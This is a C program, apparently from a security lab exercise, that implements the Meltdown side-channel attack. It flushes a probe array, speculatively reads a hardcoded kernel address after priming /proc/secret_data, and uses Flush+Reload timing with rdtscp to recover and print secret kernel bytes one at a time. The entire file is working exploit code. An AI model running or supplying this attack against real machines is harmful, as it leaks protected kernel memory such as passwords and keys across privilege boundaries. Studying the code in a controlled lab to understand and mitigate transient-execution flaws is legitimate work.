#include <emmintrin.h>
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
uint8_t array[256 * 4096];
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024
#define DEBUG
void flushSideChannel() {
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i * 4096 + DELTA] = 1;

  // flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i * 4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved() {
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  }
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr) {
  char kernel_data = 0;

  // Give eax register something to do
  asm volatile(
      ".rept 800;"
      "add $0x141, %%eax;"
      ".endr;"

      :
      :
      : "eax");

  // The following statement will cause an exception
  kernel_data = *(char *)kernel_data_addr;
  array[kernel_data * 4096 + DELTA] += 1;
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }

int main(int argc, char **argv) {
  int i, j, ret = 0;
  size_t len;
  unsigned long long target = 0xfa603000;

  if (argc == 2) {
    len = atoi(argv[1]);
  }

  // Register signal handler
  signal(SIGSEGV, catch_segv);

  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }

  flushSideChannel();

  while (len) {
    memset(scores, 0, sizeof(scores));

    // Retry 1000 times on the same address.
    for (i = 0; i < 1000; i++) {
      ret = pread(fd, NULL, 0, 0);
      if (ret < 0) {
        perror("pread");
        break;
      }

      // Flush the probing array
      for (j = 0; j < 256; j++) _mm_clflush(&array[j * 4096 + DELTA]);

      if (sigsetjmp(jbuf, 1) == 0) {
        meltdown_asm(target);
      }

      reloadSideChannelImproved();
    }

    // Find the index with the highest score.
    int max = 0;
    for (i = 0; i < 256; i++) {
#ifdef DEBUG
      if (scores[i]) printf("(%d:%d)\n", i, scores[i]);
#endif
      if (scores[max] < scores[i]) max = i;
    }
    --len;
    ++target;
    printf("%c", max);
#ifdef DEBUG
    printf("\n");
#endif
  }
  printf("\n");
  return 0;
}
